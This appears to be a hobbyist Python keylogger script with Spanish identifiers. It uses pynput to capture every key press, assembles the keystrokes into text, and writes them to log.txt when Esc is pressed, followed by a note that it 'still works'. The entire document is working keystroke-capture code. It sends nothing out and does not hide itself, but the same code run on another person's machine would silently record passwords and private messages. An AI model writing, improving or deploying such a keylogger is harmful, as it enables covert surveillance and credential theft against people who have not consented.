import pynput.keyboard

log_file=open('log.txt','w+')
def imprimir():
    teclas = ''.join(key_list)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()
key_list = []

def convert(key):
    if isinstance(key,pynput.keyboard.KeyCode):     
        return key.char
    else:
        return str(key) 

def push(key):
    key1=convert(key) 
    if key1 == "Key.esc":
        print("saliendo.....")
        imprimir()
        return False
    elif key1 == "Key.space":
        key_list.append(" ")
    elif key1 == "Key.enter":
        key_list.append('\n')
    elif key1 == "Key.backspace":
        pass
    elif key1 == "Key.tab":
        pass
    elif key1 == "Key.shift":
        pass
    else:
        key_list.append(key1)

with pynput.keyboard.Listener(on_press=push) as listen:
    listen.join()

    "Notes: still works but i'm trying to improver " 
         
